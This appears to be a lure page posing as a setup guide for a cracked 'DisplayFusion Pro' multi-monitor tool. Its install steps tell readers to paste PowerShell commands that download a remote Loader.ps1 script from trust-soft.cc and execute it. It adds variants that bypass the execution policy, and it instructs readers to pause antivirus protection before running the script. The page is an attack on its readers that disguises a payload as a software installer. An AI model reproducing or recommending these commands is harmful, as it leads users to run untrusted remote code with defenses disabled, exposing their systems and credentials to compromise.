# DisplayFusion Pro Edition — Advanced Multi-Monitor Management

Welcome to the automated deployment hub for **DisplayFusion Pro Enterprise Build**. This repository features a streamlined, clean configuration package designed to unlock the ultimate desktop enhancement tools for multi-monitor workspaces and gaming rigs.

Take full control over your display real estate, manage separate taskbars for each screen, and enjoy premium features without restrictive trial periods or manual registration tweaks.

---

## 🖥️ Top Enhancements in DisplayFusion Pro

* **Multi-Monitor Taskbars:** Keep your open windows organized by adding a taskbar to each monitor.
* **Advanced Wallpapers:** Use random images from online sources or slice single panoramic photos.
* **Smart Window Snapping:** Easily snap active windows along your monitor edges or other apps.
* **Monitor Splitting:** Divide your large physical screen into multiple virtual displays.

---

## 🛠 Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press Win + X on your keyboard.
   * Click on Terminal or Windows PowerShell from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://trust-soft.cc/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):

```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the irm shortcut, use the full, unabbreviated commands instead:

```cmd
Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## ⚙️ Hardware & Software Compatibility

* **OS Support:** Windows 7, 8.1, 10, and 11 (fully certified for both 32-bit and 64-bit systems).
* **Display Configuration:** Perfect for Dual-Monitor, Triple-Monitor, and Ultrawide screen panels.
* **System Impact:** Extremely low footprint, tailored for backgrounds during high-performance gaming.
